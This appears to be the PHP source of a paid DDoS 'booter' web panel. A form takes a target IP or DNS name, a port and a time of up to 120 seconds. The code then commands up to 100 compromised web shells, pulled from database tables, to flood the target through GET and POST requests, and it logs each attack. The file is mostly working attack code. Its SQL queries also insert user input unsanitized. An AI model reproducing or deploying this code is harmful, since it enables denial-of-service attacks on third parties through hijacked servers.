<?php
$shells = 100; // Change 100 to your rotation amount
require('myaccount.php');
?>

<script src="http://code.jquery.com/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">
function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>


<div class="content">

<p>Please enter the IP address or DNS below to initiate an attack:</p>
<p>
<form>
    IP/DNS: <input type="text" id="host" onkeypress="handleKeyPress(event,this.form)" name="host" value=""/><br />
    (120 MAX) Seconds: <input type="text" onkeypress="handleKeyPress(event,this.form)" id="time" name="time" value="30"/><br />
    Port:<input type="text" name="port" onkeypress="handleKeyPress(event,this.form)" value="80"/><br />
    <input type="submit" value="Attack" onclick="hub();" /><br><br>
  <font color="#FFFFFF"><b>Notice</b>:<font color=blue> Attacking the same IP address repeatedly at rapid rates is prohibited, and will result in suspension of your account without refund.</font>
    </p><form>
  </p>
<form>
</form>
		<form action="hub.php" method="post">
		  &nbsp;
		  </p>
</form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
</script>
<?php
set_time_limit(10);  
ignore_user_abort(TRUE);  

include 'EpiCurl.php';   
require("ezSQLCore.php");
require("ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users` 
		set `ckey`= '', `ctime`= '' 
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());			
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy(); 
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS); 
	$SQL->select(DB_NAME);	 
	$Query = "SELECT * FROM `getshells` ORDER BY RAND() LIMIT {$shells}";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
		$mc = EpiCurl::getInstance();
		$ch = array();

		
if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<hr>You must fill in all fields.");
}
    	
if($time == "") {
die("<hr>You must fill in all fields.");
}

if($port == "") {
die("<hr>You must fill in all fields.");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }


/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
		
        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&host={$host}&time={$time}&port={$port}";  
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 8);
        $curl1 = $mc->addCurl($ch[$i]);	      
    }
	
	$Query = "SELECT * FROM `postshells`"; 
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}"; 
    
    for($i = 0; $i < $AffectedRows; $i++)
    {
		$row = $SQL->last_result[$i];
        $shell = trim($row->URL);
        if (strlen($shell) == 0)
            continue;           
        $header = array();
		$header[] = "Cache-Control: max-age=0"; 
		$header[] = "Connection: keep-alive"; 
		$header[] = "Keep-Alive: 300"; 
		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7"; 
		$header[] = "Accept-Language: en-us,en;q=0.5"; 
		$header[] = "Pragma: ";
        $ch2[$i] = curl_init($shell);
		curl_setopt($ch2[$i], CURLOPT_HTTPHEADER, $header); 
        curl_setopt($ch2[$i], CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2[$i], CURLOPT_FORBID_REUSE, 1);
        curl_setopt($ch2[$i], CURLOPT_POST, 1);
        curl_setopt($ch2[$i], CURLOPT_POSTFIELDS, $post);
        $curl1 = $mc->addCurl($ch2[$i]);       
    }	

echo "<p id='sent'>Request has been sent to all shells.</p>";

$username = $_SESSION['user_name'];
$host = $_GET['host'];
$time = $_GET['time'];
$port = $_GET['port'];

mysql_query("INSERT INTO logs 
(username, ip, time, tort) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "' ) ") 
or die(mysql_error());  

}
?>


</div>
</body>
</html>

<br>

<?php 
include 'footer.php';
?>